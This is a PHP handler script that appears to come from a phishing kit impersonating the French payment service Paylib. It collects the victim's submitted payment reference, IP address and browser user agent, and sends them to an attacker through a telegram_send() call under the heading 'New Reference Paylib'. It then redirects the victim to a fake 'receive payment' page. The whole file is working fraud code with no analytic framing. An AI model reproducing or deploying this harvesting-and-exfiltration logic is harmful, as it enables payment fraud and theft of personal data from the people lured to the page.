<?php

require_once '../../tlx.php';


$ip = getenv("REMOTE_ADDR");

          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

   
            $DAk89 .= "𝗡𝗲𝘄 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲 𝗣𝗮𝘆𝗹𝗶𝗯 | ".$ip."\n\n";
            $DAk89 .= "Référence: ".$_POST['reference']."\n";
            $DAk89 .= "▬▬▬▬▬\n";
            $DAk89 .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $DAk89 .= "🔥 𝘥𝘢𝘴_𝘬𝘰𝘯𝘨𝘭𝘰𝘮𝘦𝘳𝘢𝘵 🔥\n";

            

             telegram_send(urlencode($DAk89));
header("Location: ../recevoir-paiement.php");


?>